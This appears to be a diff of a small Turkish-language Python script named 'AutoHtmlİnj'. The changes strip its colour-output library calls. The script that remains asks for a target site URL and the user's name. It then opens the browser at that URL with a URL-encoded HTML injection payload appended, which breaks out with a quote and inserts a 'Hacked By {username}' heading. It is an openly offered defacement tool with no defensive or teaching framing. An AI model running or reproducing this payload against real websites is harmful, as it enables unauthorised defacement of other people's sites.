@@ -1,25 +1,17 @@
 import time
-import colorama
 import webbrowser
-from colorama import Fore, Back, Style
-colorama.init()
-print(Fore.RED)
 print("""================================
-
 ##############################
-#        AutoHtmlİnj         #
-#                            #
-#   ===[ Jroken ]===         #
-#                            #
-#       ===[ ByTegn ]===     #
+#        AutoHtmlİnj         #
+#                            #
+#   ===[ Jroken ]===         #
+#                            #
+#       ===[ ByTegn ]===     #
 #                            #
 ##############################
-
 İnstagram : hakoo28_
 İnstagram : ozekk35
-
 =================================""")
-print(Fore.CYAN)
 site = input('Siteyi Giriniz : ')
 time.sleep(0.5)
 print()
@@ -37,14 +29,12 @@ secenek6 = print('6-Renkli Kalın + Kayan Yazı')
 print()
 time.sleep(0.4)
 sorgu = int(input('==> '))
-print(Fore.GREEN)
 time.sleep(0.3)
 username = input('İndexteki Adınız : ')
 time.sleep(0.6)
 print()
 print("İndex Hazırlanıyor Lütfen Bekleyin")
 time.sleep(1)
-print(Fore.YELLOW)
 if (sorgu==1):
   webbrowser.open(f'{site}%27%3Ccenter%3E%3Cb%3E%3Ch1%3EHacked%20By%20{username}%3C/h1%3E%3C/b%3E%3C/center%3E')
   print()
